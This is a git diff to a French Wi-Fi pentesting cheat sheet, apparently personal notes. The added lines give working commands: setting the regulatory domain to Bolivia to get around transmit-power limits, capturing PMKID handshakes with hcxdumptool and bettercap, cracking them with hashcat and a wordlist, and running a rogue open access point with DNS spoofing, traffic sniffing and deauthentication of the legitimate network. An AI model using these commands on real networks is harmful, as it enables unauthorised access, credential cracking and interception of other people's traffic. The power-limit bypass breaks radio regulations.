@@ -167,6 +167,7 @@ sudo rfkill unblock all
 Pour fixer la puissance d'émission :
 
 ```sh
+sudo iw reg set BO #pas de règle en zone Bolivie
 iw wlan0 set txpower fixed 3000
 ```
 
@@ -261,21 +262,54 @@ aircrack-ng.exe -w wordlist.txt file.cap
 ### PMKID
 
 > [!TIP]
-> WiFi 6/WPA3 normalement PMKID Prood
+> WiFi 6/WPA3 normalement PMKID Prood, pas mal d'équipements patché depuis 2018...
 
-Outil : `hcxtools` ou `Bettercap` (wifi.assoc all).
+Avec `hcxtools` :
 
 ```sh
-# passage en mode monitor au préalable
-sudo apt update
-sudo apt install hcxtools hcxdumptool hashcat
-sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
-# une fois le PMKID, on extrait ensuite le hash
+# passage en mode monitor au préalable, existe aussi hcxdumptool -m wlan0 
+apt install hcxtools hcxdumptool hashcat
+sudo hcxdumptool -i wlan0 -o capture.pcapng -F
+```
+
+Avec `BetterCap`
+
+```sh
+bettercap -iface wlan0
+set wifi.interface wlan0
+wifi.recon on
+wifi.recon.channel 6
+wifi.assoc <all | bssid>
+get wifi.handshakes.file
+```
+
+si on a : `[wifi.client.handshake] 11:22:33:44:55:66 -> 77:88:99:AA:BB:CC [RSN PMKID]`, c'est gagné. les hash sont dans `/root/bettercap-wifi-handshakes.pcap`
+
+Pour cracker les hash :
+
+```sh
 hcxpcapngtool -o hash_pour_crack.22000 capture.pcapng
 hashcat -m 22000 hash_pour_crack.22000 /usr/share/wordlists/rockyou.txt
 ```
 
 ### Rogue AP
+
+via `Bettercap` :
+
+```sh
+bettercap -iface wlan0
+set wifi.ap.ssid "Mon_Reseau_Test"
+set wifi.ap.channel 1
+set wifi.ap.encryption false
+wifi.recon on
+wifi.ap
+dhcp6.status on
+dns.spoof on
+net.sniff on
+set net.sniff.verbose true
+wifi.show
+wifi.deauth <bssid-legit>
+```
 
 Alternative à `BetterCap` :
 
